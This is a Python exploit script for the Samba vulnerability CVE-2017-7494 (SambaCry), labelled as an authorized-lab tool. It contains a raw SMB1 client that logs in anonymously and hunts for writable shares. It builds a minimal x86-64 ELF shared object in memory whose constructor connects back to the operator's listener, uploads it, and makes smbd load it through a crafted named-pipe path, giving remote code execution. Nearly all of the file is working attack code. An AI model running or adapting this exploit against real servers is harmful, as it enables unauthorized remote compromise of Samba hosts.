#!/usr/bin/env python3
"""CVE-2017-7494 (SambaCry) - authorized-lab deploy.

Implements the full chain with only stdlib + a raw SMB1 client:

1. SMB1 NEGOTIATE (NT LM 0.12) + anonymous NTLMSSP session setup.
2. Share walk: tree-connect to a candidate list of writable share names.
3. .so staging: OPEN_ANDX + WRITE_ANDX uploads a hand-assembled minimal
   x86-64 ELF shared object (DT_INIT constructor) whose constructor
   connects back to this tool's TCP callback listener and sends a marker.
4. Trigger: opens the staged file as a named pipe on IPC$ with an
   absolute path ("/<server-path>/<file>.so"); smbd's is_known_pipename()
   dlopens it, executing the constructor.

The ELF is assembled in memory at runtime (no external toolchain needed);
the constructor uses raw syscalls (socket/connect/write/close) so it is
self-contained and safe to load inside smbd.
"""
import argparse
import json
import random
import socket
import string
import struct
import sys
import threading
import time

SMB_NEGOTIATE = 0x72
SMB_SESSION_SETUP = 0x73
SMB_TREE_CONNECT = 0x75
SMB_OPEN_ANDX = 0x2D
SMB_WRITE_ANDX = 0x2F
SMB_CLOSE = 0x04
SMB_TREE_DISCONNECT = 0x71

STATUS_MORE_PROCESSING = 0xC0000016

DEFAULT_SHARES = ["PUBLIC", "public", "share", "shared", "tmp", "data",
                  "files", "samba", "anonymous", "guest", "upload", "media",
                  "incoming", "documents", "backup", "transfer"]
DEFAULT_PATH_TEMPLATES = [
    "/srv/{share}", "/srv/samba/{share}", "/var/lib/samba/{share}",
    "/home/{share}", "/data/{share}", "/mnt/{share}", "/media/{share}",
    "/export/{share}", "/opt/{share}", "/samba/{share}", "/srv",
]


def rand_str(n=10):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


# ----------------------------------------------------------------------------
# Raw SMB1 client (ASCII strings, NT status codes, anonymous NTLMSSP)
# ----------------------------------------------------------------------------
class SMBClient:
    def __init__(self, host, port, timeout):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock = None
        self.uid = 0
        self.mid = 0
        self.extended = False

    def connect(self):
        self.sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
        self.sock.settimeout(self.timeout)

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def _recv_exact(self, n):
        buf = b""
        while len(buf) < n:
            data = self.sock.recv(n - len(buf))
            if not data:
                raise ConnectionError("SMB connection closed by peer")
            buf += data
        return buf

    def _transact(self, command, params, data_bytes, tid=0, uid=None):
        """Send one SMB1 request and return (nt_status, wct, params, bcc, bytes)."""
        self.mid = (self.mid + 1) & 0xFFFF
        flags = 0x18
        flags2 = 0x4003  # NT status codes + extended security negotiation + long names
        if uid is None:
            uid = self.uid
        header = struct.pack("<4sBIBBH HQ HHHHH",
                             b"\xffSMB", command, 0, flags, flags2, 0, b"\x00" * 8,
                             0, tid, 0x1234, uid, self.mid)
        # struct.pack above overallocates; rebuild precisely:
        header = b"\xffSMB"
        header += struct.pack("<B", command)
        header += struct.pack("<I", 0)
        header += struct.pack("<B", flags)
        header += struct.pack("<H", flags2)
        header += struct.pack("<H", 0)          # pid high
        header += b"\x00" * 8                    # signature
        header += struct.pack("<H", 0)           # reserved
        header += struct.pack("<H", tid)
        header += struct.pack("<H", 0x1234)      # pid
        header += struct.pack("<H", uid)
        header += struct.pack("<H", self.mid)
        assert len(header) == 32
        msg = header
        if params is None:
            msg += b"\x00" + struct.pack("<H", 0)
        else:
            wct = len(params) // 2
            msg += struct.pack("<B", wct) + params + struct.pack("<H", len(data_bytes or b""))
        msg += data_bytes or b""
        self.sock.sendall(msg)

        resp = self._recv_exact(32)
        status = struct.unpack("<I", resp[5:9])[0]
        wct = self._recv_exact(1)[0]
        pbytes = self._recv_exact(wct * 2) if wct else b""
        bcc = struct.unpack("<H", self._recv_exact(2))[0]
        dbytes = self._recv_exact(bcc) if bcc else b""
        resp_uid = struct.unpack("<H", resp[30:32])[0]
        resp_tid = struct.unpack("<H", resp[24:26])[0]
        return status, wct, pbytes, dbytes, resp_uid, resp_tid

    def negotiate(self):
        dialects = b"\x02NT LM 0.12\x00"
        status, wct, pbytes, dbytes, _, _ = self._transact(SMB_NEGOTIATE, None, dialects)
        if status != 0:
            raise OSError("negotiate failed: NT status 0x%08x" % status)
        # params: dialect idx, sec mode, mpx, vcs, maxbuf, maxraw, key, caps(4)
        if len(pbytes) < 24:
            raise OSError("short negotiate response")
        capabilities = struct.unpack("<I", pbytes[20:24])[0]
        self.extended = bool(capabilities & 0x80000000)
        return "NT LM 0.12", capabilities

    @staticmethod
    def _ntlmssp_type1():
        return (b"NTLMSSP\x00" + struct.pack("<II", 1, 0x206) +
                struct.pack("<HHI", 0, 0, 32) +   # domain
                struct.pack("<HHI", 0, 0, 32) +   # workstation
                struct.pack("<HHI", 0, 0, 32))    # version-less

    @staticmethod
    def _ntlmssp_type3():
        # anonymous authenticate: all buffers empty
        body = b"NTLMSSP\x00" + struct.pack("<I", 3)
        off = 8 + 4 + 6 * 8 + 4
        for _ in range(6):
            body += struct.pack("<HHI", 0, 0, off)
        body += struct.pack("<I", 0x206)
        return body

    def session_setup_anonymous(self):
        def setup(blob):
            params = b"\xff\x00" + struct.pack("<H", 0)
            params += struct.pack("<HHH", 65535, 10, 1)     # maxbuf, mpx, vc
            params += struct.pack("<I", 0)                   # session key
            params += struct.pack("<H", len(blob))           # security blob length
            params += struct.pack("<H", 0)                   # reserved
            params += struct.pack("<I", 0)                   # reserved
            params += struct.pack("<I", 0)                   # capabilities
            data = blob + b"QuantumDeploy\x00" + b"QuantumLab\x00"
            status, wct, pbytes, dbytes, uid, _ = self._transact(SMB_SESSION_SETUP, params, data)
            return status, wct, pbytes, dbytes, uid

        if self.extended:
            blob = self._ntlmssp_type1()
            status, wct, pbytes, dbytes, uid = setup(blob)
            if status == STATUS_MORE_PROCESSING:
                idx = dbytes.find(b"NTLMSSP\x00")
                if idx < 0:
                    raise OSError("no NTLMSSP type-2 blob in session setup response")
                blob3 = self._ntlmssp_type3()
                status, wct, pbytes, dbytes, uid = setup(blob3)
            if status != 0:
                raise OSError("NTLMSSP anonymous session setup failed: 0x%08x" % status)
            self.uid = uid
            return True
        # non-extended anonymous: empty user + 1-byte null password
        params = b"\xff\x00" + struct.pack("<H", 0)
        params += struct.pack("<HHH", 65535, 10, 1)
        params += struct.pack("<I", 0)
        params += struct.pack("<H", 1) + struct.pack("<H", 0)   # oem pw len, unicode len
        params += struct.pack("<I", 0) + struct.pack("<I", 0)
        data = b"\x00" + b"QuantumDeploy\x00" + b"QuantumLab\x00" + b"\x00" + b"\x00"
        status, wct, pbytes, dbytes, uid, _ = self._transact(SMB_SESSION_SETUP, params, data)
        if status != 0:
            raise OSError("anonymous session setup failed: 0x%08x" % status)
        self.uid = uid
        return True

    def tree_connect(self, share):
        path = ("\\\\%s\\%s" % (self.host, share)).encode()
        params = b"\xff\x00" + struct.pack("<HHH", 0, 0, 1)   # andx, flags, pwlen=1
        data = b"\x00" + path + b"\x00" + b"?????\x00"
        status, wct, pbytes, dbytes, _, tid = self._transact(SMB_TREE_CONNECT, params, data)
        if status != 0:
            return None, status
        return tid, status

    def tree_disconnect(self, tid):
        self._transact(SMB_TREE_DISCONNECT, b"", b"", tid=tid)

    def open_andx(self, tid, name, write=True):
        """OPEN_ANDX (create-or-open). Returns (fid, status)."""
        params = b"\xff\x00" + struct.pack("<HH", 0, 0)      # andx, flags
        params += struct.pack("<HHHH", 2 if write else 0, 6, 0, 0)  # access, search attr, file attr
        params += struct.pack("<I", 0)                        # creation time
        params += struct.pack("<H", 0x0011)                   # open function: create-or-open
        params += struct.pack("<I", 0)                        # allocation size
        params += b"\x00" * 8                                  # reserved
        data = name.encode() + b"\x00"
        status, wct, pbytes, dbytes, _, _ = self._transact(SMB_OPEN_ANDX, params, data, tid=tid)
        if status != 0:
            return None, status
        fid = struct.unpack("<H", pbytes[4:6])[0]
        return fid, status

    def write_andx(self, tid, fid, blob):
        params = b"\xff\x00" + struct.pack("<HH", 0, fid)
        params += struct.pack("<II", 0, 0)          # offset, timeout
        params += struct.pack("<HHH", 0, 0, len(blob))  # write mode, remaining, data length
        params += struct.pack("<H", 57)             # data offset from message start
        status, wct, pbytes, dbytes, _, _ = self._transact(SMB_WRITE_ANDX, params, blob, tid=tid)
        return status, struct.unpack("<H", pbytes[4:6])[0] if wct and len(pbytes) >= 6 else 0

    def close_fid(self, tid, fid):
        params = struct.pack("<HI", fid, 0)
        status, *_ = self._transact(SMB_CLOSE, params, b"", tid=tid)
        return status


# ----------------------------------------------------------------------------
# Minimal x86-64 ELF shared object with a DT_INIT constructor
# ----------------------------------------------------------------------------
def build_ctor(cb_ip, cb_port, marker):
    msg = b"sambacry:" + marker.encode() + b"\n"
    ip_bytes = socket.inet_aton(cb_ip)  # network order
    port_be = struct.pack(">H", cb_port)
    sockaddr = b"\x02\x00" + port_be + ip_bytes + b"\x00" * 8
    assert len(sockaddr) == 16
    sock_qword = struct.unpack("<Q", sockaddr)[0]

    write_block = (b"\xb8\x01\x00\x00\x00"        # mov eax,1 (write)
                  b"\x89\xdf"                     # mov rdi,rbx
                  b"\x48\x8d\x35" + b"\x00\x00\x00\x00"  # lea rsi,[rip+msg] (patched)
                  b"\xba" + struct.pack("<I", len(msg))  # mov edx,len
                  b"\x0f\x05")                   # syscall
    code = (b"\x53"                               # push rbx
            b"\xb8\x29\x00\x00\x00"               # mov eax,41 (socket)
            b"\xbf\x02\x00\x00\x00"               # mov edi,AF_INET
            b"\xbe\x01\x00\x00\x00"               # mov esi,SOCK_STREAM
            b"\x31\xd2"                           # xor edx,edx
            b"\x0f\x05"                           # syscall
            b"\x89\xc3"                           # mov ebx,eax (sockfd)
            b"\x48\xb8" + struct.pack("<Q", sock_qword)  # mov rax, sockaddr
            b"\x50"                               # push rax
            b"\xb8\x2a\x00\x00\x00"               # mov eax,42 (connect)
            b"\x89\xdf"                           # mov rdi,rbx
            b"\x48\x89\xe6"                       # mov rsi,rsp
            b"\xba\x10\x00\x00\x00"               # mov edx,16
            b"\x0f\x05"                           # syscall
            b"\x85\xc0"                           # test eax,eax
            b"\x75" + bytes([len(write_block)])   # jnz -> close
            ) + write_block + (
            b"\x48\x83\xc4\x08"                    # add rsp,8
            b"\xb8\x03\x00\x00\x00"               # mov eax,3 (close)
            b"\x89\xdf"                           # mov rdi,rbx
            b"\x0f\x05"                           # syscall
            b"\x5b"                               # pop rbx
            b"\xc3")                              # ret
    # patch lea rip-relative displacement to the message
    lea_index = code.index(b"\x48\x8d\x35")
    disp_pos = lea_index + 3
    rip_after = disp_pos + 4
    msg_offset = len(code)
    disp = msg_offset - rip_after
    code = code[:disp_pos] + struct.pack("<i", disp) + code[disp_pos + 4:]
    return code + msg


def build_elf_so(ctor_code):
    ehsz, phsz = 64, 56
    dynsym_off = 176
    dynstr_off = dynsym_off + 24           # one null Elf64_Sym
    hash_off = dynstr_off + 1
    if hash_off % 4:
        hash_off += 4 - (hash_off % 4)
    dyn_off = hash_off + 16
    if dyn_off % 8:
        dyn_off += 8 - (dyn_off % 8)
    code_off = dyn_off + 16 * 7
    total = code_off + len(ctor_code)

    ehdr = b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8
    ehdr += struct.pack("<HHIQQQIHHHHHH",
                        3, 62, 1,             # ET_DYN, EM_X86_64, EV_CURRENT
                        0, 64, 0, 0,          # entry, phoff, shoff
                        64, 56, 2, 0, 0, 0)   # ehsize, phentsize, phnum
    phdr_load = struct.pack("<IIQQQQQQ", 1, 7, 0, 0, 0, total, total, 0x1000)
    phdr_dyn = struct.pack("<IIQQQQQQ", 2, 6, dyn_off, dyn_off, dyn_off,
                          16 * 7, 16 * 7, 8)
    dynsym = b"\x00" * 24
    dynstr = b"\x00"
    hash_tbl = struct.pack("<IIII", 1, 1, 0, 0)
    dynamic = b"".join(struct.pack("<QQ", tag, val) for tag, val in [
        (4, hash_off),       # DT_HASH
        (5, dynstr_off),     # DT_STRTAB
        (6, dynsym_off),     # DT_SYMTAB
        (10, 1),             # DT_STRSZ
        (11, 24),            # DT_SYMENT
        (12, code_off),      # DT_INIT -> constructor
        (0, 0),              # DT_NULL
    ])
    blob = bytearray(total)
    blob[0:64] = ehdr
    blob[64:120] = phdr_load
    blob[120:176] = phdr_dyn
    blob[dynsym_off:dynsym_off + 24] = dynsym
    blob[dynstr_off] = dynstr[0]
    blob[hash_off:hash_off + 16] = hash_tbl
    blob[dyn_off:dyn_off + len(dynamic)] = dynamic
    blob[code_off:code_off + len(ctor_code)] = ctor_code
    return bytes(blob)


# ----------------------------------------------------------------------------
# TCP callback listener
# ----------------------------------------------------------------------------
class CallbackListener(threading.Thread):
    def __init__(self, port):
        super().__init__(daemon=True)
        self.port = port
        self.hits = []
        self._lock = threading.Lock()
        self._stop = threading.Event()

    def run(self):
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", self.port))
            srv.listen(8)
            srv.settimeout(1.0)
        except OSError:
            return
        while not self._stop.is_set():
            try:
                conn, addr = srv.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            conn.settimeout(5.0)
            try:
                data = conn.recv(1024)
                with self._lock:
                    self.hits.append({"peer": addr[0], "data": data.decode("latin-1").strip()})
            except OSError:
                pass
            finally:
                try:
                    conn.close()
                except OSError:
                    pass
        try:
            srv.close()
        except OSError:
            pass

    def stop(self):
        self._stop.set()

    def snapshot(self):
        with self._lock:
            return list(self.hits)


def detect_source_ip(target):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((target, 9))
            return s.getsockname()[0]
        finally:
            s.close()
    except OSError:
        return "127.0.0.1"


def run(args):
    result = {
        "cve": "CVE-2017-7494",
        "target": "%s:%d" % (args.target, args.port),
        "vulnerable": False,
        "verified_by": None,
        "smb": {},
        "shares_found": [],
        "writable_shares": [],
        "staged": [],
        "triggers": [],
        "callback": None,
        "error": None,
    }
    marker = "sc" + rand_str(10)
    listener = CallbackListener(args.callback_port)
    listener.start()
    time.sleep(0.2)

    try:
        cli = SMBClient(args.target, args.port, args.timeout)
        cli.connect()
        try:
            dialect, caps = cli.negotiate()
            result["smb"] = {"dialect": dialect, "capabilities": "0x%08x" % caps,
                            "extended_security": cli.extended}
            cli.session_setup_anonymous()
            result["smb"]["anonymous_session"] = True
        except OSError as exc:
            result["error"] = "SMB session failed: %s" % exc
            return result

        shares = [args.share] if args.share else DEFAULT_SHARES
        so_bytes = build_elf_so(build_ctor(args.callback_host, args.callback_port, marker))
        filename = "%s.so" % marker

        for share in shares:
            tid, status = cli.tree_connect(share)
            if tid is None:
                continue
            result["shares_found"].append(share)
            fid, open_status = cli.open_andx(tid, filename, write=True)
            if fid is None:
                cli.tree_disconnect(tid)
                continue
            wr_status, written = cli.write_andx(tid, fid, so_bytes)
            cli.close_fid(tid, fid)
            if written == len(so_bytes):
                result["writable_shares"].append(share)
                result["staged"].append({"share": share, "filename": filename,
                                        "bytes": written})
            cli.tree_disconnect(tid)

        if not result["staged"]:
            result["error"] = "no writable share found for .so staging (shares seen: %s)" % \
                (result["shares_found"] or "none")
            return result

        ipc_tid, status = cli.tree_connect("IPC$")
        if ipc_tid is None:
            result["error"] = "cannot connect to IPC$ (NT status 0x%08x)" % status
            return result

        path_candidates = {}
        for entry in result["staged"]:
            if args.server_path:
                path_candidates[entry["share"]] = [args.server_path]
            else:
                path_candidates[entry["share"]] = [
                    t.format(share=entry["share"]) for t in DEFAULT_PATH_TEMPLATES]

        try:
            for share in path_candidates:
                for server_path in path_candidates[share]:
                    pipename = "/%s/%s" % (server_path.strip("/"), filename)
                    fid, open_status = cli.open_andx(ipc_tid, pipename, write=False)
                    trig = {"share": share, "server_path": server_path,
                            "pipename": pipename,
                            "status": "0x%08x" % open_status,
                            "pipe_opened": fid is not None}
                    result["triggers"].append(trig)
                    if fid is not None:
                        cli.close_fid(ipc_tid, fid)
                    time.sleep(0.4)
                    if any(marker in h.get("data", "") for h in listener.snapshot()):
                        break
                if any(marker in h.get("data", "") for h in listener.snapshot()):
                    break
        finally:
            try:
                cli.tree_disconnect(ipc_tid)
            except OSError:
                pass

        deadline = time.time() + args.wait
        while time.time() < deadline:
            if any(marker in h.get("data", "") for h in listener.snapshot()):
                break
            time.sleep(0.5)

        hits = [h for h in listener.snapshot() if marker in h.get("data", "")]
        result["callback"] = hits[0] if hits else None
        if hits:
            result["vulnerable"] = True
            result["verified_by"] = ("smbd dlopened staged %s via pipename %s; constructor called back"
                                     % (filename, hits and result["triggers"][-1]["pipename"] if result["triggers"] else ""))
        elif result["triggers"]:
            result["error"] = ("pipe trigger(s) issued but no constructor callback within %.0fs "
                               "(server-side path guess may be wrong; use --server-path)" % args.wait)
        return result
    finally:
        listener.stop()


def main():
    p = argparse.ArgumentParser(description="CVE-2017-7494 SambaCry authorized-lab deploy")
    p.add_argument("--target", required=True)
    p.add_argument("--port", type=int, default=445)
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--share", default=None, help="pin one share instead of the share walk")
    p.add_argument("--server-path", default=None,
                   help="absolute server-side path of the share root (e.g. /srv/public)")
    p.add_argument("--callback-host", default=None, help="IP the .so calls back to (default: auto-detect)")
    p.add_argument("--callback-port", type=int, default=4444, help="local TCP callback listener port")
    p.add_argument("--wait", type=float, default=10.0, help="seconds to wait for the constructor callback")
    args = p.parse_args()
    if args.callback_host is None:
        args.callback_host = detect_source_ip(args.target)
    try:
        result = run(args)
    except Exception as exc:
        result = {"cve": "CVE-2017-7494", "target": "%s:%d" % (args.target, args.port),
                  "vulnerable": False, "error": "%s: %s" % (type(exc).__name__, exc)}
    print(json.dumps(result, indent=2))
    return 0 if result.get("vulnerable") else 1


if __name__ == "__main__":
    sys.exit(main())
